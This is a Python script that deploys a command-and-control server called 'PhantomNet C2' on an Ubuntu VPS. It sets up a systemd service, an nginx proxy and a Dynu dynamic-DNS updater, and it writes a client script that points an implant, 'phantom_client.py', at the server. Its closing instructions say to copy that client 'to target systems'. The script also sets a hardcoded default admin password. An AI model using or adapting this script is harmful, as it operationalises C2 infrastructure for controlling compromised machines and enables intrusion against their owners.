#!/usr/bin/env python3
"""
PhantomNet C2 Server - Ubuntu VPS Deployment Script
Automated deployment script for Ubuntu 24.04 VPS
"""

import os
import sys
import subprocess
import time
import json

def run_command(command, description):
    """Run a shell command and handle errors"""
    print(f"\n🔄 {description}...")
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        print(f"✅ {description} completed successfully")
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"❌ {description} failed: {e}")
        print(f"Error output: {e.stderr}")
        return None

def check_root():
    """Check if running as root"""
    if os.geteuid() != 0:
        print("❌ This script must be run as root (use sudo)")
        sys.exit(1)

def update_system():
    """Update system packages"""
    commands = [
        "apt update",
        "apt upgrade -y",
        "apt autoremove -y"
    ]

    for cmd in commands:
        if not run_command(cmd, f"Running: {cmd}"):
            return False
    return True

def install_dependencies():
    """Install required system dependencies"""
    packages = [
        "python3",
        "python3-pip",
        "python3-venv",
        "git",
        "curl",
        "wget",
        "ufw",
        "nginx",
        "certbot",
        "python3-certbot-nginx"
    ]

    for package in packages:
        if not run_command(f"apt install -y {package}", f"Installing {package}"):
            return False
    return True

def setup_firewall():
    """Configure firewall"""
    commands = [
        "ufw --force reset",
        "ufw default deny incoming",
        "ufw default allow outgoing",
        "ufw allow ssh",
        "ufw allow 80/tcp",
        "ufw allow 443/tcp",
        "ufw allow 8443/tcp",
        "ufw --force enable"
    ]

    for cmd in commands:
        if not run_command(cmd, f"Firewall: {cmd}"):
            return False
    return True

def create_app_directory():
    """Create application directory"""
    app_dir = "/opt/phantomnet"
    commands = [
        f"mkdir -p {app_dir}",
        f"chown -R $SUDO_USER:$SUDO_USER {app_dir}",
        f"chmod 755 {app_dir}"
    ]

    for cmd in commands:
        if not run_command(cmd, f"Creating app directory: {cmd}"):
            return False
    return True

def setup_python_environment():
    """Setup Python virtual environment"""
    app_dir = "/opt/phantomnet"
    commands = [
        f"cd {app_dir}",
        "python3 -m venv venv",
        "source venv/bin/activate && pip install --upgrade pip",
        "source venv/bin/activate && pip install -r requirements.txt"
    ]

    for cmd in commands:
        if not run_command(cmd, f"Python setup: {cmd}"):
            return False
    return True

def create_systemd_service():
    """Create systemd service for the application"""
    service_content = """[Unit]
Description=PhantomNet C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/phantomnet
Environment=PATH=/opt/phantomnet/venv/bin
ExecStart=/opt/phantomnet/venv/bin/python phantom_c2_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

    with open("/etc/systemd/system/phantomnet.service", "w") as f:
        f.write(service_content)

    commands = [
        "systemctl daemon-reload",
        "systemctl enable phantomnet.service",
        "systemctl start phantomnet.service"
    ]

    for cmd in commands:
        if not run_command(cmd, f"Systemd service: {cmd}"):
            return False
    return True

def setup_nginx():
    """Configure Nginx as reverse proxy"""
    nginx_config = """server {
    listen 80;
    server_name _;

    location / {
        proxy_pass http://127.0.0.1:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
"""

    with open("/etc/nginx/sites-available/phantomnet", "w") as f:
        f.write(nginx_config)

    commands = [
        "ln -sf /etc/nginx/sites-available/phantomnet /etc/nginx/sites-enabled/",
        "rm -f /etc/nginx/sites-enabled/default",
        "nginx -t",
        "systemctl restart nginx"
    ]

    for cmd in commands:
        if not run_command(cmd, f"Nginx setup: {cmd}"):
            return False
    return True

def setup_ssl():
    """Setup SSL certificate with Let's Encrypt"""
    print("\n🔒 SSL Certificate Setup")
    print("You can optionally set up SSL with Let's Encrypt.")
    print("To do this manually, run:")
    print("certbot --nginx -d your-domain.com")
    print("\nFor now, the server will run on HTTP (port 80)")

def create_deployment_files():
    """Create deployment files in the app directory"""
    app_dir = "/opt/phantomnet"

    # Copy server files
    files_to_copy = [
        "phantom_c2_server.py",
        "phantom_client.py",
        "requirements.txt",
        "templates/",
        "Features.txt"
    ]

    for file in files_to_copy:
        if os.path.exists(file):
            if os.path.isdir(file):
                run_command(f"cp -r {file} {app_dir}/", f"Copying directory {file}")
            else:
                run_command(f"cp {file} {app_dir}/", f"Copying file {file}")

    # Set permissions
    run_command(f"chown -R root:root {app_dir}", "Setting ownership")
    run_command(f"chmod -R 755 {app_dir}", "Setting permissions")

def create_client_script():
    """Create a client deployment script"""
    client_script = """#!/bin/bash
# PhantomNet Client Deployment Script

echo "Installing PhantomNet Client..."

# Install Python dependencies
pip3 install pycryptodome psutil requests

# Get server IP
echo "Enter the server IP address:"
read SERVER_IP

# Update client configuration
sed -i "s|https://your-c2-server.com:8443|http://$SERVER_IP:80|g" phantom_client.py

echo "Client configured! Run with: python3 phantom_client.py"
"""

    with open("/opt/phantomnet/deploy_client.sh", "w") as f:
        f.write(client_script)

    run_command("chmod +x /opt/phantomnet/deploy_client.sh", "Making client script executable")

def setup_dynu():
    """Setup Dynu for dynamic IP and hostname updates"""
    print("\n🔄 Setting up Dynu for dynamic IP and hostname updates...")
    dynu_token = input("Enter your Dynu token: ").strip()
    dynu_domain = input("Enter your Dynu domain: ").strip()

    dynu_config = {
        "domain": dynu_domain,
        "token": dynu_token,
        "last_update": "never",
        "is_active": True
    }

    with open("/opt/phantomnet/dynu_config.json", "w") as f:
        json.dump(dynu_config, f)

    dynu_service_content = """[Unit]
Description=Dynu Updater for PhantomNet
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/phantomnet
ExecStart=/opt/phantomnet/venv/bin/python dynu_updater.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

    with open("/etc/systemd/system/dynu-updater.service", "w") as f:
        f.write(dynu_service_content)

    commands = [
        "systemctl daemon-reload",
        "systemctl enable dynu-updater.service",
        "systemctl start dynu-updater.service"
    ]

    for cmd in commands:
        if not run_command(cmd, f"Dynu service: {cmd}"):
            return False
    return True

def create_dynu_updater_script():
    """Create a Dynu updater script"""
    dynu_updater_script = """#!/usr/bin/env python3
import os
import json
import requests
import time
from datetime import datetime, timedelta

def update_dynu():
    config_path = "/opt/phantomnet/dynu_config.json"
    with open(config_path, "r") as f:
        config = json.load(f)

    domain = config["domain"]
    token = config["token"]
    last_update = config["last_update"]

    if last_update == "never" or (datetime.now() - datetime.strptime(last_update, '%Y-%m-%d %H:%M:%S')).seconds > 28800:
        try:
            # Get current public IP
            ip_response = requests.get('https://api.ipify.org?format=json')
            current_ip = ip_response.json()['ip']

            # Update Dynu
            update_url = f"https://api.dynu.com/nic/update?hostname={domain}&myip={current_ip}"
            response = requests.get(update_url, headers={'Authorization': f'Token {token}'})

            if response.status_code == 200:
                config["last_update"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                with open(config_path, "w") as f:
                    json.dump(config, f)
                print(f"Dynu updated successfully: {domain} -> {current_ip}")
            else:
                print(f"Dynu update failed: {response.text}")
        except Exception as e:
            print(f"Dynu update error: {e}")

if __name__ == "__main__":
    while True:
        update_dynu()
        time.sleep(28800)  # Check every 8 hours
"""

    with open("/opt/phantomnet/dynu_updater.py", "w") as f:
        f.write(dynu_updater_script)

    run_command("chmod +x /opt/phantomnet/dynu_updater.py", "Making Dynu updater script executable")

def main():
    """Main deployment function"""
    print("🚀 PhantomNet C2 Server - Ubuntu VPS Deployment")
    print("=" * 50)

    # Check if running as root
    check_root()

    # Get server configuration
    print("\n📋 Server Configuration")
    server_ip = input("Enter server IP address: ").strip()
    admin_password = input("Enter admin password (default: phantom_admin_2024): ").strip()
    if not admin_password:
        admin_password = "phantom_admin_2024"

    # Update system
    if not update_system():
        print("❌ System update failed")
        return

    # Install dependencies
    if not install_dependencies():
        print("❌ Dependency installation failed")
        return

    # Setup firewall
    if not setup_firewall():
        print("❌ Firewall setup failed")
        return

    # Create app directory
    if not create_app_directory():
        print("❌ App directory creation failed")
        return

    # Create deployment files
    create_deployment_files()

    # Setup Python environment
    if not setup_python_environment():
        print("❌ Python environment setup failed")
        return

    # Update server configuration
    app_dir = "/opt/phantomnet"
    server_file = f"{app_dir}/phantom_c2_server.py"

    # Update server IP in client file
    client_file = f"{app_dir}/phantom_client.py"
    if os.path.exists(client_file):
        with open(client_file, 'r') as f:
            content = f.read()
        content = content.replace("https://your-c2-server.com:8443", f"http://{server_ip}:80")
        with open(client_file, 'w') as f:
            f.write(content)

    # Create client deployment script
    create_client_script()

    # Setup systemd service
    if not create_systemd_service():
        print("❌ Systemd service setup failed")
        return

    # Setup Nginx
    if not setup_nginx():
        print("❌ Nginx setup failed")
        return

    # Setup SSL (optional)
    setup_ssl()

    # Setup Dynu
    if not setup_dynu():
        print("❌ Dynu setup failed")
        return

    # Create Dynu updater script
    create_dynu_updater_script()

    # Final configuration
    print("\n✅ Deployment completed successfully!")
    print("\n📊 Server Information:")
    print(f"   Server IP: {server_ip}")
    print(f"   Admin Panel: http://{server_ip}:80")
    print(f"   Admin Username: admin")
    print(f"   Admin Password: {admin_password}")
    print(f"   App Directory: {app_dir}")

    print("\n🔧 Management Commands:")
    print("   Start service: systemctl start phantomnet")
    print("   Stop service: systemctl stop phantomnet")
    print("   Restart service: systemctl restart phantomnet")
    print("   View logs: journalctl -u phantomnet -f")

    print("\n📱 Client Deployment:")
    print("   Copy phantom_client.py to target systems")
    print("   Run: python3 phantom_client.py")

    print("\n🔒 Security Notes:")
    print("   - Change default admin password")
    print("   - Configure Dynu for dynamic IP")
    print("   - Consider setting up SSL certificate")
    print("   - Monitor firewall logs")

if __name__ == "__main__":
    main()